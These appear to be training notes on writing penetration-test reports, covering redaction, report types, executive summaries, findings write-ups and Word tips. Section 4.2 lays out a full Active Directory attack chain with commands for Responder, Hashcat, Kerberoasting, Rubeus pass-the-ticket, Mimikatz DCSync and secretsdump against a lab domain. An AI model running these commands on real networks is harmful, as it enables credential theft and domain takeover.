    │   │   ├── 5. OSINT Data.md
    │   │   ├── 6. Credentials.md
    │   │   ├── 7. Web Application Research.md
    │   │   ├── 8. Vulnerability Scan Research.md
    │   │   ├── 9. Service Enumeration Research.md
    │   │   ├── 10. AD Enumeration Research.md
    │   │   ├── 11. Attack Path.md
    │   │   └── 12. Findings.md
    │   └── Scans
    └── Retest
```
This folder/notes pairing is just what worked for the module''s authors — adjust it freely to fit your own workflow and the type of assessment you''re performing.

## 2.8 Formatting and Redaction

Before putting any screenshot or text into a report, you must redact credentials and Personally Identifiable Information (PII), along with anything morally objectionable like graphic content or offensive language. Useful formatting techniques include:

- Adding arrows/boxes to highlight important areas in a screenshot (avoid doing this directly in MS Word — edit the image itself).
- Adding a thin border around images so they stand out from the page background.
- Cropping screenshots down to only the relevant part (e.g. just the login form, not the whole screen).
- Including the browser address bar or other identifying info so the reader knows exactly what host/URL is shown.

## 2.9 Screenshots

Wherever possible, prefer pasting raw terminal **text** output instead of a screenshot of the terminal — it''s easier to redact, easier to highlight (e.g. blue for the command, red for the key result), looks cleaner in the document, and keeps file size down. You are allowed to shorten long output using `<SNIP>`, but you must **never alter** the actual command or result shown — that would misrepresent what really happened. Using text-based output also lets the client copy/paste your commands directly to reproduce the issue themselves, which is extremely valuable. Also make sure any pasted text has formatting fully stripped before going into Word, since leftover smart-quotes or non-UTF-8 characters can silently break a command when the client tries to copy it.

## 2.10 Terminal Redaction

The most common thing that needs redacting from terminal output is credentials — whether in the command itself or in its output, including password hashes. For a hash, you can strip the middle portion and leave the first/last 3-4 characters to prove a hash existed. For cleartext credentials, replace them with a placeholder like `<REDACTED>` or `<PASSWORD REDACTED>`.

**Important — avoid pixelation/blurring for redaction.** Research has shown that blurred or pixelated text can often be reversed using tools like Unredacter. Instead, use solid black bars (or another solid shape) drawn directly onto the image file itself — never just an overlay shape inside MS Word, since that can be deleted by anyone with access to the document. Also, if posting anything publicly online (e.g. a blog), never try to hide sensitive text using CSS tricks like matching the text color to the background — this can be revealed instantly by highlighting the text or viewing the page source.

Color-coded highlighting of terminal output (e.g., blue for the command run, red for the key result) is also recommended — it makes it much easier for a non-expert reader to identify exactly what matters in a large wall of output, especially for complex payloads like URL-encoded web requests.

## 2.11 What Not to Archive

As a penetration tester, you are trusted to "do no harm" in the client''s environment. This means avoiding actions that bring down hosts, change passwords without permission, make hard-to-reverse configuration changes, or extract sensitive data unnecessarily. If you find a network share full of sensitive files, it''s best to just **screenshot the directory listing** rather than opening and screenshotting individual file contents — the filenames alone usually prove the point. Actually collecting real PII and pulling it out of the client''s environment can create serious compliance problems (e.g. GDPR) for both you and your company, so avoid this entirely.

## 2.12 Module Exercises

This section gives you a hands-on practice environment: a partially filled-out Obsidian notebook on a Parrot Linux host you can spawn from the module. You connect to it using RDP with the command below.

**Step 1 — Connect to the practice VM via RDP (xfreerdp):**
```bash
xfreerdp /v:10.129.203.82 /u:htb-student /p:HTB_@cademy_stdnt!
```
This logs you into the remote Parrot VM desktop using the given IP, username, and password. Once connected, you can open Obsidian from the desktop, browse the sample notebook, and explore how the folder/notes structure looks in practice.

A downloadable copy of the same Obsidian notebook is available in the module''s Resources tab — once unzipped, open it locally in Obsidian using **"Open folder as vault."**

---

# 3. Types of Reports

The exact structure of your report depends heavily on the type of assessment performed. This module focuses mainly on an **Internal Penetration Test** report where the tester fully compromised Active Directory, but it also touches on how other report types differ (e.g. extra appendices commonly seen in External Penetration Test reports). Since the lab environment isn''t a real internet-facing company, OSINT data (emails, subdomains, breach credentials, domain ownership info) isn''t included in the sample — but you''d normally gather that using separate tools/techniques covered in other modules like *Information Gathering - Web Edition* and *OSINT: Corporate Recon*.

## 3.1 Vulnerability Assessment

A Vulnerability Assessment is an automated scan of an environment to find vulnerabilities — it can be authenticated or unauthenticated, and no manual exploitation is attempted. Testers may validate scanner results to separate real issues from false positives, though some clients simply want raw, unvalidated scan results. An **external scan** targets public-facing systems from an anonymous internet perspective; an **internal scan** is run from behind the firewall, sometimes with credentials for deeper (but noisier) results. Report content for this type usually focuses on patterns and themes across a large number of findings rather than a narrative attack chain, since raw scan data can get overwhelming fast.

## 3.2 Penetration Testing

Penetration Testing goes further than a scan — it actively exploits vulnerabilities, sometimes guided by scan data, and can be performed from different perspectives: **black box** (no extra info given), **grey box** (given IP ranges only), or **white box** (given credentials, source code, configs). Testing can also vary by stealth level: **non-evasive** (uncover as many issues as possible), **hybrid evasive** (start stealthy, get noisier over time to test detection), or **fully evasive** (stay hidden as long as possible to simulate an advanced attacker, sometimes over a multi-month engagement). Like vulnerability assessments, penetration tests can be **internal** (targeting the AD environment, privilege escalation, lateral movement) or **external** (targeting internet-facing hosts, often using OSINT first).

## 3.3 Inter-Disciplinary Assessments

Some engagements need multiple specialists working together rather than one generalist tester. The module lists several examples:

- **Purple Team Style Assessments** — a penetration tester (red) works directly with an incident responder (blue) to test whether the client''s detection tooling correctly identifies simulated attacks.
- **Cloud Focused Penetration Testing** — benefits from someone with cloud architecture knowledge, especially for unconventional resources like containers and serverless apps, though reporting stays similar to a standard pentest.
- **Comprehensive IoT Testing** — IoT has three layers (network, cloud, application) plus an optional hardware layer, each often needing a specialist; reporting still uses the standard pentest layout.
- **Web Application Penetration Testing** — can be scoped narrowly (just the app) or broadly (the app plus the infrastructure behind it), sometimes requiring both an application specialist and a network-focused tester.
- **Hardware Penetration Testing** — common for IoT devices, laptops, kiosks, or ATMs; the rules of engagement must clearly define how destructive testing is allowed to be before starting.

## 3.4 Draft Report

Clients increasingly expect a chance to give feedback before a report is finalized — maybe they want to add their own planned remediation response, tone down certain language, or reorganize sections. Because of this, it''s best practice to submit a **draft report** first, give the client time to review it independently, and then schedule a call to walk through questions and requested changes together.

## 3.5 Final Report

After the client reviews the draft and confirms they''re satisfied (with any agreed changes made), you issue the **final report**. This step matters because many auditing firms will not accept a draft report as valid proof of compliance — only a final, signed-off version counts.

## 3.6 Post-Remediation Report

Clients often ask you to retest previously found issues after they''ve attempted to fix them — this is required for standards like PCI compliance. You should **not** redo the entire original assessment; only retest the specific findings and hosts from the original report. It''s also important to set a time limit on how long after the original test you''ll perform remediation testing, because:

- If too much time passes, the environment may have changed so much that a fair "apples to apples" comparison becomes impossible.
- Checking the *entire* environment for newly affected hosts can trap you in an endless retesting loop.
- Running fresh large-scale scans will likely surface brand-new findings, causing scope creep.

If a client pushes back because of time pressure from an auditor, you can suggest they ask the auditor to accept a well-documented remediation plan with a realistic deadline instead — this keeps your integrity intact while still helping the client. You can either treat a long-overdue retest as an entirely new assessment, or clearly note in the report how much time has passed and that it''s only validating the originally reported issues on the originally reported hosts.

## 3.7 Attestation Report

Some clients need a short **Attestation Letter/Report** to prove to their own vendors or customers that a penetration test was performed, without revealing the actual technical details, findings, or credentials to that third party. This document is derived from the full report but only mentions the number of findings, the general approach taken, and high-level comments about the environment — typically just one or two pages long.

## 3.8 Other Deliverables

Beyond the main report, clients may request additional deliverables:

- **Slide Deck** — A presentation that can be tailored to either a technical or executive audience. Avoid relying purely on graphs/numbers — include relevant anecdotes or real-world industry incidents to keep the audience engaged (without resorting to fear-mongering).
- **Spreadsheet of Findings** — A tabular version of all report findings (without the executive summary or narrative) that the client can sort, filter, or import into a ticketing system. Learning to use pivot tables here can help the client prioritize remediation by severity or category.

## 3.9 Vulnerability Notifications

Sometimes during testing you discover something so critical that you must pause and notify the client immediately, rather than waiting for the final report — this gives them the choice to issue an emergency fix right away or wait until testing concludes.

**When to draft one:** At minimum, for any internet-facing, directly exploitable finding resulting in unauthenticated remote code execution, sensitive data exposure, or weak/default credentials leading to the same. Beyond that baseline, the exact threshold (e.g. all highs/criticals, or even mediums) should be agreed upon with the client during project kickoff.

**Contents:** Keep these notifications short and to the point — just the technical details and evidence needed for the client''s technical team to start fixing the issue immediately, without extra "fluff."

---

# 4. Components of a Report

The report is the main deliverable a client is paying for, so it needs to be free of clutter and focused entirely on helping the client understand and prioritize their security posture. Everything included should serve a clear purpose — for example, never paste in 50+ pages of raw console output just because you can. This section breaks down the key building blocks of a professional report.

## 4.1 Prioritizing Our Efforts

During a large assessment you will be hit with a ton of "noise" from scans and enumeration. The skill here is filtering out low-value findings so you can focus on high-impact ones like Remote Code Execution (RCE) or sensitive data disclosure. You''re still required to report everything you find (including minor/informational issues), but instead of spending hours validating 35 different SSL/TLS misconfigurations individually, it''s smarter to **consolidate** similar minor issues into one category and simply show awareness that they exist. When stuck on whether something is worth chasing, lean on senior teammates — their experience can save you hours of wasted effort on dead ends or broken PoCs.

## 4.2 Writing an Attack Chain

The Attack Chain section is where you narrate, step by step, how you went from zero access to full compromise — showing how multiple findings combine to create a bigger risk than any single one alone. A classic example is combining a medium-risk LLMNR/NBT-NS spoofing issue with a missing SMB signing misconfiguration to achieve full compromise. The module walks through a full real-world-style attack chain example against the fictional **INLANEFREIGHT.LOCAL** domain. Below is a simplified, step-by-step breakdown of that attack chain, including the tool used at each stage and why.

**Step 1 — Capture an NTLMv2 hash using Responder.**
Responder listens for NBT-NS/LLMNR broadcast traffic on the local network and tricks misconfigured Windows hosts into sending authentication hashes to it.
```bash
sudo responder -I eth0 -wrfv
```
This captured a hash for the domain user `bsmith`.

**Step 2 — Crack the captured hash offline using Hashcat.**
Hashcat takes the captured NTLMv2 hash and tests it against a wordlist (rockyou.txt) to recover the cleartext password.
```bash
hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt
```
Mode `5600` tells Hashcat the hash is NTLMv2. Cracking this gave a foothold as a normal domain user.

**Step 3 — Enumerate Kerberoastable accounts with GetUserSPNs.py.**
This Impacket tool lists domain accounts that have a Service Principal Name (SPN) set, which makes them targets for a Kerberoasting attack.
```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204
```
This revealed several SPN accounts, including `mssqlsvc`, which had local admin rights on host `SQL01`.

**Step 4 — Enumerate the domain with BloodHound.py.**
BloodHound.py (the Python port of SharpHound) collects users, groups, computers, ACLs, and session data to help visualize attack paths in a GUI.
```bash
sudo bloodhound-python -u ''bsmith'' -p ''<REDACTED>'' -d inlanefreight.local -ns 192.168.195.204 -c All
```
This confirmed `mssqlsvc` had `AdminTo` rights over the SQL01 host — a high-value target.

**Step 5 — Kerberoast the specific `mssqlsvc` account.**
Using the same GetUserSPNs tool but targeting one account retrieves its Kerberos TGS ticket, which is encrypted with that account''s password hash.
```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
```

**Step 6 — Crack the TGS ticket offline with Hashcat.**
```bash
hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt
```
Mode `13100` is for Kerberos 5 TGS-REP hashes. This revealed the `mssqlsvc` account''s cleartext password.

**Step 7 — Use the cracked credentials to dump LSA secrets with CrackMapExec.**
```bash
crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
```
This dumped a cleartext password for the `srvadmin` account, which had local admin rights on nearly every server in the domain.

**Step 8 — Log into another host and find a logged-in privileged user.**
Using RDP with the `srvadmin` credentials, the tester found another user, `pramirez`, also logged in:
```cmd
query user
```
BloodHound confirmed `pramirez` had **DCSync** rights over the domain — meaning their account could be used to extract the password hash of any domain user.

**Step 9 — Steal the logged-in user''s Kerberos ticket with Rubeus.**
```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
```
`triage` lists all cached Kerberos tickets; `dump` extracts the specific ticket for the `pramirez` user.

**Step 10 — Perform a Pass-the-Ticket attack using the stolen ticket.**
```powershell
.\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```
This imports the stolen ticket into the current session, authenticating as `pramirez` without ever knowing their password. Confirm it worked with:
```powershell
klist
```

**Step 11 — Perform a DCSync attack using Mimikatz.**
```powershell
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
```
DCSync abuses a legitimate domain-controller replication protocol to retrieve the password hash of any domain user — here, the built-in Administrator account.

**Step 12 — Confirm domain compromise with CrackMapExec.**
```bash
sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```
This authenticates using the stolen NTLM hash directly (pass-the-hash) to prove full control over the domain.

**Step 13 — Dump the full NTDS database with secretsdump.py.**
```bash
secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
```
This extracts NTLM password hashes for **every user in the domain**, which can then be cracked offline to measure password strength across the whole organization (useful for the Domain Password Analysis appendix later).

**Presentation style:** Break each step into its own figure/screenshot, write a short narrative paragraph between figures explaining what''s happening and why, and avoid cramming multiple commands into a single screenshot — this keeps the walkthrough understandable for a less technical reader. You can reuse this same evidence later inside the individual findings section, so you never have to format things twice.

## 4.3 Writing a Strong Executive Summary

The Executive Summary is arguably the single most important section of the report, because it''s the part read by non-technical decision-makers — the people who control the budget needed to actually fix the issues you found. If you lose this audience''s attention here, the rest of your technical work may never get acted on.

**Key assumptions to keep in mind while writing:**
- The reader has **zero technical background** — if your own parents couldn''t understand it, rewrite it.
- The reader doesn''t know what tools like Rubeus do or what a "ticket" even means in this context.
- This might be their very first exposure to a penetration test.
- Their attention span is short — once lost, it rarely comes back.
- Nobody enjoys having to Google a term just to follow your report.

**Do:**
- Be specific with numbers — avoid vague words like "several" or "multiple," since they could mean 6 or 500.
- Keep it short — if it''s more than 1.5–2 pages, you''re being too verbose.
- Describe real-world impact in plain terms (e.g. "accessed HR documents and banking systems" instead of "obtained Domain Admin").
- Explain what broader process failure caused the issue, not just "install 3 patches."
- If experienced enough, give a rough sense of how much effort remediation will take (low/moderate/significant).

**Don''t:**
- Name or recommend specific commercial vendors — keep vendor suggestions out-of-band, not in the report.
- Use acronyms (SNMP, MitM, etc.) — these instantly alienate a non-technical reader.
- Spend more time on minor issues than on the real, significant findings.
- Use unnecessarily fancy vocabulary that sends the reader to a dictionary.
- Reference more technical sections later in the report — the executive summary must stand alone.

**Vocabulary substitutions** (examples of translating technical terms into plain language):
- VPN/SSH → "a protocol used for secure remote administration"
- SSL/TLS → "technology used to facilitate secure web browsing"
- Hash → "the output from an algorithm commonly used to validate file integrity"
- Password Spraying → "an attack in which a single, easily-guessable password is attempted for a large list of harvested accounts"
- Password Cracking → "an offline attack converting an encrypted password back to its readable form"
- Buffer overflow / deserialization → "an attack that resulted in remote command execution"
- OSINT → "Open Source Intelligence Gathering — using public sources to find info on a company/employees"
- SQL injection/XSS → "a vulnerability where user input is accepted without proper sanitization, allowing the application''s logic to be manipulated"

**Anatomy of writing the summary:** Start by listing all your findings and grouping them by the *nature* of the underlying risk (e.g. several findings might all boil down to "weak configuration management"). This grouping is what you build your paragraphs around — you don''t need a paragraph for every single finding, just the most impactful themes. Also be careful with wording: avoid absolute statements. For example, instead of writing "testing went completely undetected," write "testing activities seemed to go mostly unnoticed" — you can''t be 100% sure the client didn''t detect something they chose not to mention. Similarly, instead of implying the client has done "nothing" about a process (e.g. hardening templates), phrase it as "review configuration management processes and address the gaps that led to the issues identified in this report" — this avoids sounding insulting if they actually tried and simply fell short.

## 4.4 Summary of Recommendations

Before diving into the full technical findings, it''s good practice to include a **Summary of Recommendations** (or Remediation Summary) section listing short, medium, and long-term fixes based on your findings and knowledge of the client''s environment, budget, and staffing. Clients will often use this section directly as the basis for their remediation roadmap, so getting it right matters — if you skip this, clients will likely ask you to prioritize for them anyway, especially if there are many high-risk findings. Every recommendation should tie back to a specific finding later in the report. Long-term recommendations can be broader/process-level (e.g. "create baseline hardening templates for Windows Server and Workstation hosts" or "perform periodic social engineering engagements with training"). Some findings warrant **both** a short-term fix (e.g. push the missing patch) and a long-term fix (e.g. review the patch management process itself so the same gap doesn''t reappear).

## 4.5 Findings Section Overview

This is one of the most important sections of the report — it''s your chance to show your technical work, explain risk to the client, and give technical teams the exact evidence needed to reproduce and fix each issue. This section is covered in full detail in [Section 5](#5-how-to-write-up-a-finding) of these notes.

## 4.6 Appendices

Appendices supplement the main report body with reference material. Some appear in every report; others are situational.

**Static Appendices (usually present in every report):**
- **Scope** — Lists the exact scope of the assessment (URLs, IP ranges, facilities, etc.) — often required by auditors reviewing the report.
- **Methodology** — Explains the repeatable process followed to ensure consistency across assessments.
- **Severity Ratings** — Defines how severity levels were determined, especially if not directly mapped to CVSS — you may need to defend these ratings later.
- **Biographies** — Short bios proving the tester''s qualifications; required for PCI compliance reports and reassuring even without that requirement.

**Dynamic Appendices (included only when relevant):**
- **Exploitation Attempts and Payloads** — Helps the client''s forensics/incident response team tell your activity apart from a real attacker''s, and lists cleanup details for anything you couldn''t remove yourself.
- **Compromised Credentials** — A list of compromised accounts (or simply "all domain accounts" if the entire domain was compromised).
- **Configuration Changes** — An itemized list of every change made in the client''s environment, so they can revert anything if needed.
- **Additional Affected Scope** — A table of all affected hosts for a finding, when the list is too long to fit cleanly inside the finding itself.
- **Information Gathering** — Extra OSINT-related data for External Penetration Tests (whois data, subdomains, breach data, SSL/TLS analysis, open ports).
- **Domain Password Analysis** — Password-cracking statistics (number of hashes cracked, top passwords, privileged account cracks) generated using a tool like **DPAT** after dumping and cracking the NTDS database.

## 4.7 Report Type Differences

Not every assessment type needs every section covered above. For example, an External Penetration Test report with no internal compromise would skip the Attack Chain section and instead focus more on information gathering, OSINT data, and externally exposed services — it likely wouldn''t include compromised credentials, configuration changes, or domain password analysis appendices. A Web Application Security Assessment (WASA) report usually centers around the Executive Summary and Findings, often mapped against the OWASP Top 10. Physical security, red team, and social engineering reports tend to be written in a more narrative storytelling style. It''s good practice to maintain a separate ready-made template for each assessment type you commonly perform.

---

# 5. How to Write Up a Finding

The Findings section is the "meat" of the report — where you show exactly what you found, how you exploited it, and how the client can fix it. More detail here directly helps technical teams reproduce the issue and later confirm their fix actually worked. Even if you keep a database of "stock" findings for common issues, always customize the wording to fit the specific client environment — reusing a generic write-up word-for-word risks misrepresenting the actual situation (e.g. "Default Credentials" means something very different on a printer versus a building''s HVAC control system).

## 5.1 Breakdown of a Finding

Every finding should contain, at minimum, the following elements:

- Description of the finding and what platform(s) it affects
- Impact if left unresolved
- Affected systems/networks/environments/applications
- Recommendation for addressing the problem
- Reference links for further reading
- Steps to reproduce the issue plus supporting evidence

Optional extra fields you may include if relevant:
```text
- CVE
- OWASP, MITRE IDs
- CVSS or similar score
- Ease of exploitation and probability of attack
- Any other information that might help learn about and mitigate the attack
```

## 5.2 Showing Finding Reproduction Steps Adequately

Even a technical point-of-contact may have never heard of the specific tool you used, so don''t assume they can "fill in the blanks" themselves. Key guidelines:

- **One step per figure** — combining multiple steps into a single screenshot confuses readers unfamiliar with the tool.
- **Show full setup before running an exploit** — for tools like Metasploit, capture the full module configuration in one figure, then a second figure showing the exploit actually running.
- **Write narrative text between figures** — explain what''s happening and why, rather than cramming explanations into image captions.
- **Offer alternate tools** — after your main walkthrough, mention (with a reference link) other tools that could validate the same finding, without actually repeating the exploit a second time.
- **Think about how the client will use the evidence** — if they need to copy/paste a web payload to reproduce it, a plain screenshot of Burp isn''t good enough; give them the actual raw request/payload text.
- **Make evidence fully defensible** — e.g. to prove credentials are sent in cleartext over Basic Auth, it''s not enough to just screenshot the login popup; you need a Wireshark capture actually showing the cleartext credentials in transit. Similarly, always capture a URL bar or `ipconfig`/`ifconfig` output to prove a screenshot really is from the client''s environment and not a random internet image.
- **Keep browsers clean/professional** — turn off bookmarks bars and unprofessional extensions, or use a dedicated browser just for testing, before taking screenshots.

## 5.3 Effective Remediation Recommendations

Vague remediation advice wastes a learning opportunity and frustrates the reader. Compare these two examples from the module:

**Example 1 — Registry hardening**
- *Bad:* "Reconfigure your registry settings to harden against X."
- *Good:* "To fully remediate this finding, the following registry hives should be updated with the specified values. Note that changes to critical components like the registry should be approached with caution and tested in a small group prior to making large-scale changes. [list the full path to the affected registry hives] Change value X to value Y."

**Example 2 — Costly vendor tools**
- *Bad:* "Implement [some expensive commercial tool] to address this finding."
- *Good:* "There are different approaches to addressing this finding. [Vendor] has published a workaround as an interim solution (reference link provided below). Alternatively, commercial tools exist that disable the vulnerable functionality entirely, but may be cost-prohibitive."

Being specific pays off in two ways: it builds your own expertise (making you more confident answering questions in the report review call), and it shows the client you genuinely did the research for them — which increases the odds of repeat business and referrals.

## 5.4 Selecting Quality References

Choose finding references that meet these criteria:

- **Vendor-agnostic sources** are generally preferred, unless the issue is clearly vendor-specific (e.g. a Cisco ASA vulnerability warrants a Cisco link). Vendor-written articles often focus on selling their own product rather than explaining the fix.
- **Thorough, complete explanations** — avoid paywalled articles or ones that only give part of the picture.
- **Articles that get to the point** — avoid sources that bury the fix inside a huge document like NIST 800-53 or a lengthy RFC.
- **Clean, trustworthy websites** — avoid pages cluttered with ads or suspicious scripts.
- **Your own original research/blog posts** are a bonus when available — they reinforce your expertise and avoid sending clients to a competitor''s site.

## 5.5 Example Findings

The module includes two well-written example findings (Weak Kerberos Authentication / "Kerberoasting," and Tomcat Manager Weak/Default Credentials), both laid out in a tabular format with a detailed description, impact, affected hosts, actionable (vendor-neutral) remediation, and reputable reference links. Whether you use a table layout or separate heading levels per finding is a stylistic choice — what matters most is **readability**: the reader should always be able to clearly tell where one finding ends and the next begins.

## 5.6 Poorly Written Finding

The module also shows a deliberately bad example finding to highlight common mistakes:

- Sloppy formatting around the CWE reference link
- No CVSS score filled in (not mandatory everywhere, but should be filled in if your template uses one)
- A description that doesn''t clearly explain the root cause of the issue
- A vague, generic security impact statement
- Remediation advice that isn''t clear or actionable

The core lesson: a reader can tell a finding is "bad" just by seeing it marked red/high-risk, but if the write-up doesn''t educate them on *why* it matters and *what exactly* to do about it, the finding has failed at its job.

## 5.7 Hands-On Practice — WriteHat

The module provides a target VM running **WriteHat**, an open-source report-writing tool developed by Black Lantern Security, pre-populated with some sample findings. This lets you practice building a findings database and generating a full customized report without needing to set anything up yourself. Note that anything entered will be lost once the lab resets — so save a local copy of anything you want to keep.

**Step 1 — Browse to the login page** of the spawned target:
```text
https://<target-IP>/login?next=/
```

**Step 2 — Log in using the provided credentials:**
```text
Username: htb-student
Password: HTB_@cademy_stdnt!
```

Once inside, practice adding findings, generating a full report, and exploring how the tool structures its findings database — this is good preparation for the hands-on guided lab at the end of the module.

---

# 6. Reporting Tips and Tricks

Reporting can become tedious and error-prone if not managed carefully. The single biggest tip in this entire module is: **build your report as you go**, starting from the very first day of the engagement — not just at the end. While running a long scan, you can already fill in static template fields (client name, scope, dates). While testing, write up your Attack Chain and findings with evidence attached in real time, so you''re never scrambling to recapture evidence after the engagement ends.

## 6.1 Templates

Never recreate your report structure from scratch every time — maintain a blank template for every assessment type you perform, even obscure ones. If working purely in MS Word (no dedicated reporting tool), you can build templates using macros and placeholders for commonly repeated fields. **Always start from a truly blank template**, never by editing a previous client''s report — doing so risks accidentally leaving a prior client''s name or data in the new document, which looks extremely unprofessional and is easily avoidable.

## 6.2 MS Word Tips & Tricks

The module strongly recommends using **Word for Windows** rather than Word for Mac, since Mac Word lacks a VB Editor for macros and cannot reliably generate clean PDFs (it trims margins and breaks hyperlinks in the Table of Contents). Below are the core time-saving features explained:

- **Font styles** — Avoid manually bolding/coloring/underlining text ("direct formatting"). Use defined font styles instead, so fixing a mistake updates every instance across the whole document automatically instead of requiring 45 manual edits.
- **Table styles** — Same concept as font styles, applied to tables, for consistency and easier global edits.
- **Captions** — Use Word''s built-in caption feature (right-click an image/table → "Insert Caption…") so captions automatically renumber themselves if content is added or removed later.
- **Page numbers** — Makes it easy for both you and the client to reference specific parts of the document (e.g. "what does paragraph 2 on page 12 mean?").
- **Table of Contents (ToC)** — A standard part of any professional report; customizable (e.g. hide page numbers, change tab leader) via Word''s ToC settings.
- **List of Figures/Tables** — Similar to a ToC but just for figures/tables; relies on the caption feature being used consistently.
- **Bookmarks** — Used to create internal hyperlinks (e.g. to an appendix) or to tag entire sections that a macro can later remove automatically when combining templates.
- **Custom Dictionary** — An extension of AutoCorrect for words you frequently misspell or embarrassing typos (e.g. accidentally typing "pubic" instead of "public"). Note: this setting does not travel with the template file, so each person must configure it individually.
- **Language Settings** — Apply to your code/terminal font style specifically, so you can disable spell-check on that style and avoid clicking "ignore" repeatedly on every figure when spell-checking the whole document.
- **Custom Bullet/Numbering** — Used to auto-number things like findings and appendices consistently.
- **Quick Access Toolbar** (File → Options → Quick Access Toolbar) — Useful additions include **Back** (return to where you were after clicking an internal hyperlink), **Undo/Redo**, and **Save**.

**Useful hotkeys:**
```text
F4              — repeat the last formatting/action you performed
Ctrl+A, then F9 — select everything and update all fields/ToC/lists at once
Ctrl+S          — save (do this often in case Word crashes)
Ctrl+Alt+S      — split the window into two panes to view two parts of the doc at once
Shift+F5        — jump the cursor back to the location of your last edit
```

## 6.3 Automation (Macros)

Once your report template matures, macros in MS Word (saved as `.dotm` files, Windows-only for full functionality) can automate repetitive tasks:

- A pop-up macro that prompts you for key info (client name, dates, scope details, testing type, environment names) and auto-inserts it into placeholder variables throughout the template.
- A macro that merges multiple report templates into one document and removes entire bookmarked sections that don''t apply to the current assessment type — so you only maintain **one** master template instead of many separate ones.
- Macros that automate quality-assurance checks for commonly repeated mistakes.

## 6.4 Reporting Tools / Findings Database

After enough assessments, you''ll notice the same issues appear repeatedly across different clients. Without a shared findings database, you''ll waste huge amounts of time rewriting the same content and risk inconsistent quality across a team. At minimum, maintain a sanitized document of reusable findings to copy/paste from (while still customizing the details to each client). Investing in a dedicated reporting platform usually pays for itself quickly in saved time:

| Free | Paid |
|---|---|
| Ghostwriter | AttackForge |
| Dradis | PlexTrac |
| Security Risk Advisors VECTR | Rootshell Prism |
| WriteHat | |

## 6.5 Misc Tips & Tricks

A consolidated list of practical advice from the module:

- Tell a **story** with your report — explain *why* each finding matters, not just that it exists.
- **Write as you go** — don''t leave reporting until the last day of testing.
- **Stay organized** — keep notes in chronological order for easy reference later.
- Show **enough** evidence to clearly prove and reproduce an issue, without excessive, cluttering screenshots.
- Clearly label/annotate screenshots (e.g. with a tool like Greenshot) so the reader never has to guess what they''re looking at.
- **Redact sensitive data** wherever possible (passwords, hashes, other secrets) since reports often circulate to multiple people and even third parties.
- Redact unprofessional tool output (e.g. CrackMapExec''s `(Pwn3d!)` flag can be customized in its config file so you don''t have to manually remove it from every report).
- Double-check Hashcat cracked-password output for crude/offensive words pulled from wordlists — replacing them is one of the few acceptable times to alter raw output, but always flag edge cases to a manager.
- Check **grammar, spelling, and formatting** — keep fonts/sizes consistent and spell out acronyms the first time they''re used.
- Keep screenshots tightly cropped (no extra desktop clutter) and consider a light background/dark text theme if the client might print the report.
- Keep terminal screenshots professional — solid (non-transparent) background, readable color scheme, and a **professional hostname/username** (not something like `azzkicker@clientsmasher`).
- Establish a formal **QA process** — never review only your own work if avoidable; sleep on it and re-read if you have no other reviewer available.
- Establish and follow a **team style guide** for consistency across all reports.
- Use **autosave** and regularly **back up** your notes/evidence to a secondary location — don''t rely on a single VM.
- **Script and automate** repetitive tasks wherever possible for consistency and speed.

## 6.6 Client Communication

Strong written and verbal communication is just as important as technical skill. At the **start** of every engagement, send a start notification email including:

- Tester name
- Description of the type/scope of the engagement
- Source IP address used for testing
- Anticipated testing dates
- Primary and secondary contact info (email and phone)

At the **end of each day**, send a stop notification — this can also include a high-level summary of findings so far (especially useful if the final report will contain 20+ high-risk findings, so the client isn''t blindsided). These start/stop notifications also give the client a clear time window to cross-reference against any security alerts they noticed.

Beyond these formal messages, maintain open dialogue throughout testing: ask before adding a newly discovered subnet/subdomain to scope, immediately notify the client if you find something critical (e.g. SQLi or RCE on an external site) and pause testing until they confirm how to proceed, be upfront if a host appears to go down during scanning, and give the client a heads-up as soon as you achieve Domain/Enterprise Admin (so they aren''t caught off guard by alerts, and so they can tell you if there''s anything specific they''d like you to focus on or avoid with that level of access).

## 6.7 Presenting Your Report — QA Process

A sloppy, disorganized report calls the entire assessment''s quality into question, even if the actual technical work was excellent — **the report is your highlight reel**, and it''s effectively what the client is paying for. Every report should go through at least one round of QA from someone other than the author; if working solo, at minimum sleep on it and re-read with fresh eyes, since re-reading a document 40+ times makes you blind to its mistakes.

Include a **QA checklist** in your report template (remove it before final delivery) covering all the content/formatting checks relevant to your style guide — this list should grow over time as your team learns which mistakes are most common. Use a grammar tool like Grammarly or LanguageTool for an extra check, but be aware these cloud tools may send your (potentially confidential) data externally — confirm this is permitted before using them on client work. If your team scales up, track the QA process in something like a shared spreadsheet or a tool like Jira so reports don''t get lost. The QA reviewer should generally only fix minor issues (typos, phrasing, formatting) directly — larger problems (missing evidence, unclear findings, weak executive summary) should go back to the original author to fix, since they own responsibility for the deliverable''s quality. Always review tracked changes afterward as a learning opportunity so the same mistakes aren''t repeated in future reports.

A report is typically issued first as a **Draft**, then — once the client confirms they''re satisfied (or after any final agreed changes) — reissued as **Final**. Some auditors will only accept a report explicitly marked Final, so this distinction matters even if the content doesn''t change at all.

## 6.8 Report Review Meeting

Once the report is delivered, it''s customary to give the client about a week to review it on their own, then offer a call to walk through the findings together and answer questions. These calls are a great opportunity to improve how you present technical material — if you notice yourself answering the same question repeatedly across different review calls, that''s a sign your report (or your explanation style) needs adjusting. Once both sides are satisfied, the DRAFT designation is changed to FINAL and the final copy is delivered. After that, archive all testing data according to your company''s retention policy, at minimum until any agreed retest of remediated findings has been completed.

---

# 7. Documentation & Reporting Practice Lab

## 7.1 Lab Scenario and Scope

